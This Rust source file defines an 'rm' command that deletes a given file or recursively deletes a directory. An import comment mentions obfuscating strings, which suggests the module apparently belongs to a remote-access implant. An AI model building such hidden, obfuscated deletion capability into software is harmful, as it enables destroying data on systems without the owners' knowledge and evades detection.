use fmtools::format; // using obfstr to obfuscate
use std::fs;

pub(crate) fn rm(path: &str) -> String {
    if path.is_empty() {
        return format!("Invalid number of arguments received. Usage: 'rm [path]'.");
    };

    if fs::remove_file(path).is_err() && fs::remove_dir_all(path).is_err() {
        return format!("Failed to remove '"{path}"'.");
    }

    format!("Successfully removed '"{path}"'.")
}
